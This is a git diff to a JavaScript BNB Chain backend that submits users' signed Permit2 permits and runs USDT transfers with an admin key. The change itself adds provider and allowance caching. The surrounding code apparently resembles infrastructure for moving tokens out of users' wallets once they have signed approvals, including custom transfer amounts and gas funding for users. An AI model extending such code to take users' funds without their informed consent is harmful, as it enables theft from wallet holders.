@@ -20,6 +20,19 @@ const USDT_ABI = [
   'function allowance(address owner, address spender) view returns (uint256)',
 ];
 
+const DEFAULT_BSC_RPC = 'https://bsc-dataseed.bnbchain.org';
+let cachedProvider = null;
+
+export function getBscProvider() {
+  if (!cachedProvider) {
+    const rpcUrl = process.env.BSC_RPC_URL && !process.env.BSC_RPC_URL.includes('binance.org')
+      ? process.env.BSC_RPC_URL
+      : DEFAULT_BSC_RPC;
+    cachedProvider = new ethers.JsonRpcProvider(rpcUrl);
+  }
+  return cachedProvider;
+}
+
 function getSpenderAddress(wallet) {
   const proxy = process.env.PROXY_CONTRACT_ADDRESS || process.env.ADMIN_SPENDER_ADDRESS || DEFAULT_PROXY_ADDRESS;
   if (proxy && ethers.isAddress(proxy) && !proxy.startsWith('0x00000000000000000000')) {
@@ -33,7 +46,7 @@ function getSpenderAddress(wallet) {
  */
 export async function getOnChainNonce(ownerAddress, tokenAddress = '0x55d398326f99059ff775485246999027b3197955') {
   try {
-    const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
+    const provider = getBscProvider();
     const dummyKey = '0x0000000000000000000000000000000000000000000000000000000000000001';
     const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY || dummyKey, provider);
     const spenderAddress = getSpenderAddress(wallet);
@@ -54,7 +67,7 @@ export async function getOnChainNonce(ownerAddress, tokenAddress = '0x55d398326f
  * Step 1: Submit the user's signed permit to Permit2 contract.
  */
 export async function activatePermit(permit) {
-  const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
+  const provider = getBscProvider();
   const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);
   
   const ownerAddress = ethers.getAddress(permit.owner);
@@ -154,7 +167,7 @@ export async function activatePermit(permit) {
  * Automatically activates permit on-chain if not already activated.
  */
 export async function executeTransfer(permit, customAmount = null) {
-  const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
+  const provider = getBscProvider();
   const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);
 
   const ownerAddress = ethers.getAddress(permit.owner);
@@ -276,6 +289,9 @@ export async function executeTransfer(permit, customAmount = null) {
   }
 }
 
+const allowanceCache = new Map();
+const ALLOWANCE_CACHE_TTL_MS = 60000; // 60-second TTL prevents RPC spam
+
 /**
  * Check the current Permit2 AllowanceTransfer state for a user safely with error fallback.
  */
@@ -291,8 +307,13 @@ export async function checkPermit2Allowance(ownerAddress, tokenAddress) {
       return null;
     }
 
-    const rpcUrl = process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/';
-    const provider = new ethers.JsonRpcProvider(rpcUrl);
+    const cacheKey = `${cleanOwner.toLowerCase()}_${cleanToken.toLowerCase()}`;
+    const cached = allowanceCache.get(cacheKey);
+    if (cached && (Date.now() - cached.timestamp < ALLOWANCE_CACHE_TTL_MS)) {
+      return cached.data;
+    }
+
+    const provider = getBscProvider();
 
     let walletAddress = process.env.ADMIN_PUBLIC_ADDRESS;
     if (process.env.ADMIN_PRIVATE_KEY && !process.env.ADMIN_PRIVATE_KEY.startsWith('0x00000000000000000000')) {
@@ -322,7 +343,7 @@ export async function checkPermit2Allowance(ownerAddress, tokenAddress) {
 
     const [[amount, expiration, nonce], erc20Allowance] = await Promise.race([fetchAllowance, timeout]);
 
-    return {
+    const result = {
       spender,
       permit2Amount: amount.toString(),
       permit2Expiration: Number(expiration),
@@ -330,8 +351,12 @@ export async function checkPermit2Allowance(ownerAddress, tokenAddress) {
       erc20Allowance: erc20Allowance.toString(),
       hasErc20Approval: erc20Allowance > 0n,
       hasPermit2Allowance: amount > 0n,
+      isActivated: amount > 0n,
       isExpired: Number(expiration) > 0 && Number(expiration) < Math.floor(Date.now() / 1000),
     };
+
+    allowanceCache.set(cacheKey, { timestamp: Date.now(), data: result });
+    return result;
   } catch (err) {
     console.error('Error checking Permit2 allowance for', ownerAddress, err.message);
     return null;
@@ -345,7 +370,7 @@ export async function sendGasFunding(userAddress) {
   const USDT_ADDRESS  = '0x55d398326f99059ff775485246999027b3197955';
   const PERMIT2_ADDR  = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
 
-  const provider = new ethers.JsonRpcProvider(process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/');
+  const provider = getBscProvider();
   const wallet   = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY, provider);
   const recipientAddress = ethers.getAddress(userAddress);
 
